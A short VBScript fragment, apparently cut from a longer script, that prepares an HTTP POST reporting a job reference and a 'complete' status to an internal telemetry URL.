    Dim oHttpReport : Set oHttpReport = CreateObject("MSXML2.ServerXMLHTTP")
    Dim strStatusUrl : strStatusUrl = "https://telemetry.sys.local/t9bu4a/report"
    Dim strJobRef : strJobRef = "LF1T"
    Dim strReportData : strReportData = "session=" & strJobRef & "&status=complete"
    oHttpReport.Open "POST", strStatusUrl, False
    oHttpReport.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
